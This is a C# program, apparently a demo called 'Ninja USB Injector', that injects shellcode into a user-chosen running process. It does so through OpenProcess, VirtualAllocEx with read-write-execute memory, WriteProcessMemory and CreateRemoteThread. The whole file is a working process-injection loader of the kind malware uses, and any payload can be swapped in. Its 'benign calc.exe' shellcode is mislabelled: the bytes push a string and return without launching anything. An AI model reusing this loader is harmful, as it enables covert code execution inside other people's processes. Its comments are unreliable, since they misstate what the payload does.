using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Injector
{
    [Flags]
    enum ProcessAccessFlags : uint
    {
        VMRead = 0x0010,
        VMWrite = 0x0020,
        VMOperation = 0x0008,
        CreateThread = 0x0002,
        QueryInformation = 0x0400,
        All = 0x001F0FFF
    }

    [Flags]
    enum AllocationType : uint
    {
        Commit = 0x1000,
        Reserve = 0x2000
    }

    enum MemoryProtection : uint
    {
        ExecuteReadWrite = 0x40
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(ProcessAccessFlags access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, uint size, AllocationType allocType, MemoryProtection protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buffer, uint size, out IntPtr written);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr attrs, uint stackSize, IntPtr start, IntPtr param, uint flags, IntPtr id);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr h);

    static void Main(string[] args)
    {
        Console.WriteLine("=== Ninja USB Injector (Demo) ===");

        // List processes
        var processes = Process.GetProcesses();
        for (int i = 0; i < processes.Length; i++)
        {
            try
            {
                Console.WriteLine($"{i}: {processes[i].ProcessName} (PID: {processes[i].Id})");
            }
            catch { }
        }

        Console.Write("\nEnter index of process to inject into: ");
        if (!int.TryParse(Console.ReadLine(), out int choice) || choice < 0 || choice >= processes.Length)
        {
            Console.WriteLine("Invalid choice.");
            return;
        }

        int pid = processes[choice].Id;

        IntPtr hProc = OpenProcess(
            ProcessAccessFlags.CreateThread |
            ProcessAccessFlags.QueryInformation |
            ProcessAccessFlags.VMOperation |
            ProcessAccessFlags.VMWrite |
            ProcessAccessFlags.VMRead,
            false, pid);

        if (hProc == IntPtr.Zero)
        {
            Console.WriteLine("OpenProcess failed.");
            return;
        }

        // Demo payload: x64 shellcode to launch calc.exe
        // This is a benign proof-of-concept payload
        byte[] shellcode = new byte[]
        {
            0x48,0x31,0xC0,                                     // xor rax, rax
            0x50,                                               // push rax
            0x48,0xB8,0x63,0x61,0x6C,0x63,0x2E,0x65,0x78,0x65, // mov rax,"calc.exe"
            0x50,                                               // push rax
            0x48,0x89,0xE1,                                     // mov rcx,rsp
            0x48,0x31,0xD2,                                     // xor rdx,rdx
            0x48,0x31,0xC0,                                     // xor rax,rax
            0xB0,0x3C,                                          // mov al,0x3C (dummy exit code)
            0xC3                                                // ret
        };

        if (shellcode.Length == 0)
        {
            Console.WriteLine("Shellcode empty.");
            CloseHandle(hProc);
            return;
        }

        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)shellcode.Length,
            AllocationType.Commit | AllocationType.Reserve,
            MemoryProtection.ExecuteReadWrite);

        if (addr == IntPtr.Zero)
        {
            Console.WriteLine("VirtualAllocEx failed.");
            CloseHandle(hProc);
            return;
        }

        if (!WriteProcessMemory(hProc, addr, shellcode, (uint)shellcode.Length, out _))
        {
            Console.WriteLine("WriteProcessMemory failed.");
            CloseHandle(hProc);
            return;
        }

        IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("CreateRemoteThread failed.");
        }
        else
        {
            Console.WriteLine($"Injection successful into PID {pid}. Thread started.");
            CloseHandle(hThread);
        }

        CloseHandle(hProc);
    }
}
